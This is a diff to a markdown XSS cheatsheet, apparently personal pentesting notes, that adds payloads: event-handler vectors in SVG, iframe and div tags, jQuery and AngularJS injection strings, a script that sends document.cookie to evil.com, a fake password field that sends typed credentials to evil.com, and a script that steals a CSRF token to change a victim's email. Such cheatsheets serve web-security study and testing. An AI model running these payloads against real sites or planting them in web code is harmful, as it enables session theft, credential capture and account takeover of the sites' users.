@@ -7,26 +7,28 @@ description: XSS cheatsheets, payloads and tricks.
 
 ## Attack
 
-### Basic payload
+### Payloads
 
 ```html
 <sCRipT>alert()</scRipt>
 <a href="javascript:alert()"></a>
 <img src=x onerror="alert()">
+
+<svg><animatetransform onbegin=alert(1)>
+
+<iframe src='https://example.com/?search="><body onresize=print()>' onload=this.style.width='100px'>
+
+domain.com/?search=<div id=anchor onfocus=alert(document.cookie) tabindex=1>#anchor
 ```
 
 More payloads on [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
-
-### Vectors
-
-If you can control the `href` tag of an anchor (`<a>` element). You can try to set the `href` value to `javascript:alert()`.
 
 ### HTML events and tags
 
 Lists :
 
-- [all-html-events.txt]({{ base_url }}/assets/txt/all-html-events.txt)
-- [all-html-tags.txt]({{ base_url }}/assets/txt/all-html-tags.txt)
+- [all-html-events.txt](/assets/txt/all-html-events.txt)
+- [all-html-tags.txt](/assets/txt/all-html-tags.txt)
 
 > Source [www.w3schools.com - event](https://www.w3schools.com/tags/ref_eventattributes.asp) and [www.w3schools.com - tags](https://www.w3schools.com/TAGs/).
 
@@ -86,3 +88,73 @@ The `replace` function only replace the first occurence.
 "&lt;<img src=x onerror='alert()'>"
 ```
 
+### jQuery's $() selector
+
+- `<iframe src="https://example.com/" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
+
+### AngularJS ng-app
+
+- `{{$on.constructor('alert(1)')()}}`
+
+### Send cookie via POST request
+
+```html
+<script>
+fetch('https://evil.com',{method:'POST',mode:'no-cors',body:document.cookie});
+</script>
+```
+
+### Capture passwords (keylogger)
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length) fetch('https://evil.com',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">
+```
+
+### URL Reflection + Bind Key
+
+`/?%27accesskey=%27x%27onclick=%27alert()`, then `Alt+x` on Brave
+
+### HTML entity escape
+
+- `http://example&apos;,alert(),&apos;` => `('http://example',alert(),'...')'`
+
+### Change CSRF
+
+```html
+<script>
+let req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('GET', '/my-account', true);
+req.send();
+
+function handleResponse() {
+    let csrfToken = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    fetch("/my-account/change-email", {
+        "body": "email=toto@toto.com&csrf=" + csrfToken,
+        "method": "POST"
+    });
+};
+</script>
+```
+
+### Escape 
+
+`'` and `\`
+
+```html
+</script><script>alert()</script>
+```
+
+`'` with `<` filtered
+
+```html
+\';alert()//
+&apos;-alert(1)-&apos;
+```
+
+XSS inside backticks
+
+```html
+${alert(document.domain)}
+```
